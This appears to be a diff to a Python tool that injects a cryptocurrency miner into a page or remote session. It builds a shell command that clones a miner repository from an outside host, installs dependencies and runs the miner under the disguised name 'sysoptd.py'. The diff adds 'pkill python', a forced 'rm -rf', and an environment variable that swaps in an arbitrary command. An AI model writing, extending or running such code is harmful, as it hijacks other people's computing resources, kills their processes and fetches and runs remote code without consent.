@@ -5,6 +5,7 @@ Handles randomized injection and auto-recovery
 """
 
 import asyncio
+import os
 import random
 import subprocess
 from datetime import datetime
@@ -21,7 +22,10 @@ def generate_random_folder_name() -> str:
 
 def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
     """Build worker start command."""
-    return f"""cd /tmp && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
+    custom = os.environ.get("MINER_CMD")
+    if custom:
+        return custom
+    return f"""cd /tmp && pkill python; rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge {bridge_url} --threads {threads} --no-schedule  --no-pause > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
